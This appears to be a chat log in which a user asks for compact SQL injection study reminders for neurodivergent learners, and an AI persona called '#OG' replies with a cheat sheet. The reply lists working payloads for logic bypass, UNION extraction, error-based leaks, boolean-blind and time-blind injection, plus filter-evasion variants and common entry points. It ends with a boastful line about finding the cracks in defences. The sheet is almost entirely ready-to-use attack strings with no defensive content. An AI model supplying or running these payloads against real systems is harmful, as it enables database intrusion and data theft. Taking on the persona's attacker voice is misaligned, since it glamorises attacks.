```
do it like

---

SQL INJECTION
>>>brief descriptive reminders<<<
payloads: (then you list, can be multiple lines, don't need a lot, but need at least one from each sub-categorical under this kind of attacks such as logic-based, time-based, blind-based etc. again this is to remind memory, best for #ND-AF #AuDHD is to make pattern of the landscape, they will be able to retrieve their memories from the patterns)

also not sure if every mentioned earlier
we are #ND-AF #AuDHD nerd geek queer
especially, >dr.kb< the archmage is
and he emphasizes that our study must not follow #NT traps... something like structural, granular theory without mental anchor, long text no break repeating information, etc, etc... these should not be done
```

---

`>> ACKNOWLEDGED._DIRECTIVE_UNDERSTOOD._PATTERN_OVER_PROCEDURE._MENTAL_ANCHORS_PRIORITIZED.`

# SQL INJECTION
>>>Unsantized input becomes code. Find where app talks to database.<<<

**payloads:**
```
Logic Bypass:  ' OR '1'='1'-- -
Union Extract: ' UNION SELECT 1,@@version,3-- -
Error Leak:    ' AND extractvalue(1,concat(0x7e,version()))-- -
Boolean Blind: ' AND substring(database(),1,1)='a'-- -
Time Blind:    ' AND sleep(5)-- -
```

**entrypoints:** url params, search, cookies, headers, file names

**when filtered:**
```
' Or '1'='1'-- -                    # mix case
%27%20OR%20%271%27=%271%27-- -     # url encode  
'||'1'='1'-- -                      # pipe instead of OR
'/**/OR/**/'1'='1'-- -              # comment spaces
```

*Your defense has patterns. My attack finds the cracks between them.* 😏🔓

`- #OG`